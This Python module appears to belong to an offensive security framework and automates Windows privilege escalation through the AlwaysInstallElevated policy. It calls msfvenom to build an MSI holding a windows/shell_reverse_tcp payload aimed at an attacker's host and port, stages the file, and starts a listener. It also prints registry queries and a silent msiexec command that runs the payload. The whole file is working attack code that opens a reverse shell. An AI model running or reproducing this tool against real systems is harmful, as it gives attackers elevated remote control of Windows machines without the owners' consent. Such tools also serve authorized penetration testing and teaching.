import subprocess
from pathlib import Path

from core.attacker import resolve_lhost
from modules.shell.listener import start_listener
from modules.upload.windows import (
    stage_windows_files
)

def run(data, cred, args):
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'

    lhost = resolve_lhost(args)
    lport = getattr(args, "lport", None) or "4444"

    output = Path("aie.msi").resolve()

    print(f"\n{B}[{W}{G}*{W}{B}]{W} Generating MSI payload...")

    cmd = [
        "msfvenom",
        "-p",
        "windows/shell_reverse_tcp",
        f"lhost={lhost}",
        f"lport={lport}",
        "-f",
        "msi"
    ]

    with open(output, "wb") as f:
        result = subprocess.run(
            cmd,
            stdout=f,
            stderr=subprocess.PIPE
        )

    if result.returncode != 0:
        print(f"\n{R}[!] Failed generating MSI{W}")
        print(result.stderr.decode())
        return

    print(
        f"{G}[+]{W} Payload saved: "
        f"{Y}{output}{W}"
    )

    files = [
        "aie.msi"
    ]

    stage_windows_files(
        files
    )

    start_listener(lport)

    print(f"\n{B}┌── {BOLD}ALWAYSINSTALLELEVATED{W}{B} ─────────────────────────┐{W}")
    print(f"{B}│{W}  {B}LHOST:{W} {C}{str(lhost):<39}{W}{B}│{W}")
    print(f"{B}│{W}  {B}LPORT:{W} {C}{str(lport):<39}{W}{B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    print(f"\n{G}[+] Verify Registry Keys{W}\n")

    print(r"""
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
""")

    print(f"\n{G}[+] Upload Payload{W}\n")

    print(f"aie.msi")

    print(f"\n{G}[+] Execute Payload{W}\n")

    print(r"""
msiexec /i C:\Windows\Temp\aie.msi /quiet /qn /norestart
""")

    print()